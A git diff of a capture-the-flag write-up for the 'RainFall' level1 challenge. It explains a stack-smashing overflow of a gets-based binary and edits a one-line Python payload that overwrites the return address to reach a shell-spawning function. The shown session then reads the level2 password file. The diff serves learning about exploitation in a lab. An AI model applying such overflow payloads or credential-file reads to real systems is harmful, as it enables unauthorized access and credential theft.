@@ -6,11 +6,11 @@ We notice main was simple and using `gets`. We found "secret" function by decomp
 
 We investigate to find a way to execute this function. After many research we found attack named "stack smashing attack" that can be used with `gets` function. Interesting right?
 
-We made python script to fill the buffer and write an address at the end (the address of run function). The impact of doing this is to jump on run function after get entry standard. Now we get shell with level2 right 
+We made python script to fill the buffer and write an address at the end (the address of run function). The impact of doing this is to jump on run function after get entry standard. Now we get shell with level2 right
 
 
 ```bash
-level1@RainFall:~$ (python -c "import struct; print('A' * 76 + struct.pack('I', 0x8048472))";cat) | ./level1
+level1@RainFall:~$ (python -c "import struct; print('A' * 76 + struct.pack('I', 0x08048507))";cat) | ./level1
 whoami
 level2
 cat /home/user/level2/.pass
